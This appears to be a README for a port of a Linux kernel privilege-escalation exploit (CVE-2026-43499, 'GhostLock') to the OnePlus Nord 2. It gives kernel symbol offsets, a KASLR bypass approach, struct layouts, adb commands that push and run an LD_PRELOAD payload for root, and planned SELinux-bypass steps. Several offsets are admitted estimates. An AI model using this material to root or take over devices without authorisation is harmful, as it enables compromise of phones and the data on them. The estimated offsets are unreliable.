# OnePlus Nord 2 CVE-2026-43499 Exploit Port

## Overview

This is a port of the CVE-2026-43499 (GhostLock) exploit for the OnePlus Nord 2 (DN2101/DN2103) with MediaTek MT6893 running kernel 4.14.186.

## Device Information

- **Device:** OnePlus Nord 2 (DN2101/DN2103)
- **SoC:** MediaTek MT6893 (Dimensity 1200)
- **Kernel:** 4.14.186-android11
- **Kernel Base:** 0xffffff9805280800 (_stext from kallsyms)

## Key Differences from Original Aristotle

### 1. KASLR Bypass Method

**Original Aristotle (MediaTek 5.10):**
- Uses pselect slide technique to leak kernel addresses
- `kaslr_base` obtained from leaked `_stext`

**Nord 2 Port (MediaTek 4.14):**
- **Direct KASLR bypass** - uses kernel base from kallsyms directly
- Pselect slide returns garbage on this device
- `kaslr_base = ACTUAL_KERNEL_BASE` (from kallsyms)

### 2. Memory Layout

```
Nord 2 Kernel Memory Layout:
- _stext:         0xffffff9805280800 (actual kernel base)
- KIMAGE_TEXT_BASE: 0xffffffc008000000 (theoretical base)
- KASLR slide:    0xffffff9805280800 - 0xffffffc008000000 (huge value)

Address Calculation:
- All addresses: kaslr_base + (IMAGE_ADDR - KIMAGE_TEXT_BASE)
- Since kaslr_base = ACTUAL_KERNEL_BASE, this works correctly
```

### 3. rt_mutex_waiter Layout

Kernel 4.14 uses the **flat 10-word layout** (same as 5.10):
- No `wake_state` or `ww_ctx` fields (those are in 6.x)
- Total size: 0x50 (80 bytes)

### 4. MM_STRUCT Size

From `/proc/slabinfo`: **896 bytes (0x380)**

## Key Symbol Offsets

From kallsyms (offsets from _stext):

| Symbol | Offset |
|--------|--------|
| commit_creds | 0x00060f04 |
| prepare_kernel_cred | 0x0006129c |
| noop_llseek | 0x001fd140 |
| cap_capable | 0x003cb62c |
| ashmem_ioctl | 0x00d8563c |
| nfulnl_log_packet | 0x00ef0ab4 |

## Build Instructions

```bash
# Using Termux clang
make clean
make

# Or with Android NDK
make ndk NDK_ROOT=/path/to/android-ndk
```

## Install and Run

```bash
# Push to device
adb push preload.so /data/local/tmp/preload.so
adb shell chmod 0644 /data/local/tmp/preload.so

# Run exploit
adb shell 'LD_PRELOAD=/data/local/tmp/preload.so /system/bin/id'

# If successful, you should see:
# uid=0(root) gid=0(root) groups=0(root)
```

## Known Issues

### 1. init_task and init_cred Offsets

These are DATA symbols and not in kallsyms. Current values are **estimates**:

```c
#define INIT_TASK_OFF 0x01000000ULL   // ESTIMATED - needs verification
#define INIT_CRED_OFF 0x01016000ULL    // ESTIMATED - needs verification
```

**To verify:**
1. Disassemble `commit_creds` to find where it reads `init_cred`
2. Check OnePlus OSS kernel source for exact offsets
3. Search kernel image for task_struct patterns

### 2. SELinux Enforcing Offset

```c
#define SELINUX_ENFORCING_OFF 0x01400000ULL  // ESTIMATED - needs verification
```

**To verify:**
1. Check `/sys/fs/selinux/enforce` exists
2. Find `selinux_state` or `selinux_enforcing` in kernel data
3. Use `cat /proc/kallsyms | grep selinux` for hints

### 3. task_struct Offsets

Current values are estimated for 4.14. These need verification:

```c
#define TASK_REAL_CRED_OFF 0x6a8   // May vary
#define TASK_CRED_OFF 0x6b0        // May vary
#define FAKE_TASK_PI_LOCK_OFF 0x6f8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x720
```

## Testing Status

- [x] Compilation successful
- [x] Binary builds correctly
- [ ] Basic functionality test
- [ ] Kernel page setup
- [ ] Heap spray (kernelsnitch)
- [ ] Direct root stage
- [ ] SELinux bypass
- [ ] Full root achievement

## Next Steps

1. **Test basic functionality** - run on device and check logs
2. **Verify init_task/init_cred** - critical for root
3. **Check task_struct offsets** - may need adjustment
4. **Test SELinux bypass** - verify enforcing flip
5. **Debug any failures** - use logcat

## Files Modified

| File | Changes |
|------|---------|
| `src/target.h` | All Nord 2 specific offsets |
| `src/common.h` | MM_STRUCT_SZ = 0x380 |
| `src/main.c` | Direct KASLR bypass option |
| `src/offset.h` | Include our target.h |
| `Makefile` | Build configuration |

## Credits

- Original exploit: NebuSec (CyberMeowfia/IonStack)
- MediaTek 5.10 port: soralis0912 (aristotle)
- Nord 2 4.14 port: This repository
